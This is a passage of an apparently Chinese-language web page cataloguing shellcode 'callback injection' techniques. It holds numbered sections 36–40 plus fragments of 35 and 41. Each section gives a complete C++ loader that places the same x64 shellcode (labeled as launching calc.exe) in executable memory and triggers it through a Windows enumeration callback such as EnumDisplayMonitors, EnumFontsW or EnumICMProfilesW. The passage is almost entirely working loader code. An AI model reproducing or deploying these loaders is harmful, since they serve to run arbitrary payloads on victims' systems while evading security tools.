hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumDirTreeW(::GetCurrentProcess(),&nbsp;<span class="hljs-string">L"C:\\Windows"</span>,&nbsp;<span class="hljs-string">L"*.log"</span>,&nbsp;dummy,&nbsp;(PENUMDIRTREE_CALLBACKW)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span><br><span class="linenum hljs-number">42</span>}<br></code></pre>
<h1 id="h36enumdisplaymonitors"><span>36.回调函数注入 通过 EnumDisplayMonitors</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">err</span><span class="hljs-params">(<span class="hljs-keyword">const</span>&nbsp;<span class="hljs-keyword">char</span>*&nbsp;errmsg)</span>&nbsp;</span>{<br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error:&nbsp;%s&nbsp;(%u)\n"</span>,&nbsp;errmsg,&nbsp;::GetLastError());<br><span class="linenum hljs-number"> 9</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">1</span>;<br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span>}<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number">14</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">30</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">31</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">32</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">33</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;::EnumDisplayMonitors(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(MONITORENUMPROC)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span><br><span class="linenum hljs-number">46</span>}<br></code></pre>
<h1 id="h37enumfontfamiliesexw"><span>37.回调函数注入 通过 EnumFontFamiliesExW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;LOGFONTW&nbsp;lf&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;lf.lfCharSet&nbsp;=&nbsp;DEFAULT_CHARSET;<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;HDC&nbsp;dc&nbsp;=&nbsp;GetDC(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumFontFamiliesExW(dc,&nbsp;&amp;lf,&nbsp;(FONTENUMPROCW)address,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>}<br></code></pre>
<h1 id="h38enumfontfamiliesw"><span>38.回调函数注入 通过 EnumFontFamiliesW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;HDC&nbsp;dc&nbsp;=&nbsp;GetDC(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumFontFamiliesW(dc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(FONTENUMPROCW)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>}<br></code></pre>
<h1 id="h39enumfontsw"><span>39.回调函数注入 通过 EnumFontsW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 6</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">25</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;HDC&nbsp;dc&nbsp;=&nbsp;GetDC(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumFontsW(dc,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(FONTENUMPROCW)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>}<br></code></pre>
<h1 id="h40enumicmprofiles"><span>40.回调函数注入 通过 EnumICMProfiles</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;EnumICMProfiles.cpp&nbsp;:&nbsp;This&nbsp;file&nbsp;contains&nbsp;the&nbsp;'main'&nbsp;function.&nbsp;Program&nbsp;execution&nbsp;begins&nbsp;and&nbsp;ends&nbsp;there.</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//</span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number"> 7</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">10</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;HDC&nbsp;dummy&nbsp;=&nbsp;GetDC(<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumICMProfilesW(dummy,&nbsp;(ICMENUMPROCW)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>}<br></code></pre>
<h1 id="h41enumlanguagegrouplocalesw"><span>41.回调函数注入 通过 EnumLanguageGroupLocalesW</span></h1>
